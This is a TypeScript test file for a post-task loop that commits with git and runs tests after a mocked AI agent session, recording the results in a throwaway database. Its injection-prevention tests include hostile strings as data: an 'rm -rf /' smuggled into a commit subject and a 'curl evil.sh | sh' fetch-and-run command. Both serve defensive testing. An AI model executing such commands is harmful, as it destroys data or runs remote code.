import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { Db } from '../db/client';
import { runMigrations } from '../db/migrate';
import { schemaMigrations } from '../db/schema';
import { startTestDb, type TestDb } from '../db/testserver';
import { createProject } from '../projects/repo';
import { createTask, setStatus } from '../tasks/repo';
import { countByStatus } from './workqueue';
import {
	runPostTask,
	splitCommand,
	type CommandRunner,
	type CommandResult
} from './post-task';

// TASK 2.7 VERIFY (ARCHITECTURE §2.2/§3 step 7; D-008/D-016; D-018; DATA-MODEL §5).
//
// A completed (MOCKED) session triggers the post-task loop. We inject a FAKE CommandRunner
// (the same mocked-backend pattern 1.4/1.6b used — NO live process, NO shell) that RECORDS
// every (file, args, cwd) invocation and returns a scripted result. Everything written to
// the DB is read back from a real throwaway SurrealDB (no fabricated runtime data — F-008;
// a mock runner in a TEST is allowed). The two load-bearing proofs:
//   1. a completed session ⇒ a git commit (execFile ARRAYS) + a project test run, recorded
//      in ONE transaction (task→done + completion agent_event carrying the sha + test result).
//   2. a malformed path/arg can NOT inject a shell command — every dynamic value lands as a
//      single literal argv element, never a shell-parsed string (D-008).

let tdb: TestDb;
let db: Db;
let projectId: string;

beforeAll(async () => {
	tdb = await startTestDb();
	db = await Db.connect({
		url: tdb.wsUrl,
		username: tdb.root.username,
		password: tdb.root.password,
		namespace: tdb.namespace,
		database: tdb.database
	});
	await runMigrations(db, schemaMigrations);
	const project = await createProject(db, {
		slug: 'pt_proj',
		name: 'pt-proj',
		root_path: 'F:/code/ai-playground-v2',
		test_command: 'npm test'
	});
	projectId = project.id;
}, 60_000);

afterAll(async () => {
	await db?.close().catch(() => {});
	await tdb?.teardown();
});

/** A fake runner: records calls; returns per-program scripted results. NO live process. */
function fakeRunner(
	script: (file: string, args: readonly string[]) => CommandResult
): CommandRunner & { calls: { file: string; args: string[]; cwd: string }[] } {
	const calls: { file: string; args: string[]; cwd: string }[] = [];
	const fn = (async (file, args, opts) => {
		calls.push({ file, args: [...args], cwd: opts.cwd });
		return script(file, args);
	}) as CommandRunner & { calls: typeof calls };
	fn.calls = calls;
	return fn;
}

const OK: CommandResult = { code: 0, stdout: '', stderr: '' };

/** Create a fresh task moved to `in_progress` (the status a session runs out of). */
async function freshRunningTask(title = 'do the work'): Promise<string> {
	const t = await createTask(db, {
		project: projectId,
		title,
		description: 'post-task test task',
		status: 'ready'
	});
	await setStatus(db, t.id, 'in_progress');
	return t.id;
}

describe('post-task loop — commit + test in a transaction (2.7)', () => {
	it('a completed session commits (execFile arrays) + runs the test, recorded atomically', async () => {
		const taskId = await freshRunningTask();
		const sessionId = await makeSession(taskId);

		const runner = fakeRunner((file, args) => {
			if (file === 'git' && args[0] === 'rev-parse') return { code: 0, stdout: 'abc1234\n', stderr: '' };
			return OK;
		});

		const res = await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: 'feat: did the work',
				testCommand: 'npm test',
				runOk: true
			},
			{ run: runner }
		);

		// commit happened via execFile arrays — git add -A, git commit -m <msg>, rev-parse.
		const gitCalls = runner.calls.filter((c) => c.file === 'git');
		expect(gitCalls.map((c) => c.args[0])).toEqual(['add', 'commit', 'rev-parse']);
		// the commit message is ONE argv element after -m (never a shell string).
		const commitCall = gitCalls.find((c) => c.args[0] === 'commit')!;
		expect(commitCall.args).toEqual(['commit', '-m', 'feat: did the work']);
		expect(res.commit.ok).toBe(true);
		expect(res.commit.sha).toBe('abc1234');

		// the test command ran as program + args, split, no shell.
		const testCall = runner.calls.find((c) => c.file === 'npm')!;
		expect(testCall).toBeTruthy();
		expect(testCall.args).toEqual(['test']);
		expect(res.test.ok).toBe(true);

		// task moved to done.
		expect(res.taskStatus).toBe('done');
		expect(await readTaskStatus(taskId)).toBe('done');

		// the completion agent_event was written in the SAME transaction, carrying sha + test.
		const ev = await readAgentEvent(res.agentEventId);
		expect(ev.type).toBe('completion');
		expect(ev.detail.commit_sha).toBe('abc1234');
		expect(ev.detail.test_ok).toBe(true);
	});

	it('a failed test enqueues a follow_up work_item (off the interactive path)', async () => {
		const before = await countByStatus(db, 'pending');
		const taskId = await freshRunningTask('feature with broken tests');
		const sessionId = await makeSession(taskId);
		const runner = fakeRunner((file, args) => {
			if (file === 'git' && args[0] === 'rev-parse') return { code: 0, stdout: 'def5678\n', stderr: '' };
			if (file === 'npm') return { code: 1, stdout: '', stderr: '2 failing' };
			return OK;
		});

		const res = await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: 'feat: feature',
				testCommand: 'npm test',
				runOk: true
			},
			{ run: runner }
		);

		expect(res.test.ok).toBe(false);
		expect(res.followUpWorkId).toBeTruthy();
		expect(res.taskStatus).toBe('done'); // the run itself succeeded; tests failing → follow-up
		const after = await countByStatus(db, 'pending');
		expect(after).toBe(before + 1);
	});

	it('a failed agent run skips the commit and marks the task failed', async () => {
		const taskId = await freshRunningTask('run that failed');
		const sessionId = await makeSession(taskId);
		const runner = fakeRunner(() => OK);

		const res = await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: 'should not run',
				testCommand: 'npm test',
				runOk: false
			},
			{ run: runner }
		);

		expect(runner.calls.length).toBe(0); // no commit, no test
		expect(res.commit.attempted).toBe(false);
		expect(res.test.attempted).toBe(false);
		expect(res.taskStatus).toBe('failed');
		expect(await readTaskStatus(taskId)).toBe('failed');
	});
});

describe('post-task loop — no shell injection (D-008)', () => {
	it('a malformed path / arg is passed as ONE literal argv element, never shell-parsed', async () => {
		const taskId = await freshRunningTask('inject attempt');
		const sessionId = await makeSession(taskId);
		// An attacker-influenced commit subject with shell metacharacters.
		const evil = 'subject"; rm -rf / #';
		const runner = fakeRunner((file, args) => {
			if (file === 'git' && args[0] === 'rev-parse') return { code: 0, stdout: 'aaa\n', stderr: '' };
			return OK;
		});

		await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: evil,
				testCommand: 'npm test',
				runOk: true
			},
			{ run: runner }
		);

		// The evil subject is exactly ONE argv element (git's -m value) — never split into a
		// second command. There is no "rm" program call and no extra argv tokens.
		const commitCall = runner.calls.find((c) => c.file === 'git' && c.args[0] === 'commit')!;
		expect(commitCall.args).toEqual(['commit', '-m', evil]);
		expect(commitCall.args).toHaveLength(3);
		expect(runner.calls.some((c) => c.file === 'rm')).toBe(false);
		// no call's program is anything but git / the test launcher.
		expect(runner.calls.every((c) => c.file === 'git' || c.file === 'npm')).toBe(true);
	});

	it('a test_command with shell operators is NOT honoured — operators are inert argv tokens', () => {
		// splitCommand splits on whitespace with NO shell, so `;` `&&` `|` become literal
		// argv elements the program rejects — they can never spawn a second process.
		const split = splitCommand('npm test && curl evil.sh | sh')!;
		expect(split.file).toBe('npm');
		// every operator is just an argv token, not a shell control char.
		expect(split.args).toEqual(['test', '&&', 'curl', 'evil.sh', '|', 'sh']);
	});

	it('splitCommand returns null for an empty command', () => {
		expect(splitCommand('   ')).toBeNull();
	});
});

// ── small DB read-back helpers (real throwaway DB; no fabricated data) ──

async function makeSession(taskId: string): Promise<string> {
	const { StringRecordId } = await import('surrealdb');
	const [rows] = await db.query<[Array<{ id: unknown }>]>(
		`CREATE session CONTENT {
		   project: $p, task: $t, kind: "task", runtime: "claude-code",
		   model: { provider: "claude", model_id: "claude-opus-4-8", tier: "opus" }
		 } RETURN AFTER;`,
		{ p: new StringRecordId(projectId), t: new StringRecordId(taskId) }
	);
	return String(rows[0].id);
}

async function readTaskStatus(taskId: string): Promise<string> {
	const { StringRecordId } = await import('surrealdb');
	const [rows] = await db.query<[Array<{ status: string }>]>(`SELECT status FROM ONLY $t;`, {
		t: new StringRecordId(taskId)
	});
	const row = (Array.isArray(rows) ? rows[0] : rows) as { status?: string } | undefined;
	return row?.status ?? 'missing';
}

async function readAgentEvent(
	id: string
): Promise<{ type: string; detail: Record<string, unknown> }> {
	const { StringRecordId } = await import('surrealdb');
	const [rows] = await db.query<[Array<{ type: string; detail: Record<string, unknown> }>]>(
		`SELECT type, detail FROM ONLY $e;`,
		{ e: new StringRecordId(id) }
	);
	const row = (Array.isArray(rows) ? rows[0] : rows) as
		| { type: string; detail: Record<string, unknown> }
		| undefined;
	return { type: row?.type ?? 'missing', detail: row?.detail ?? {} };
}
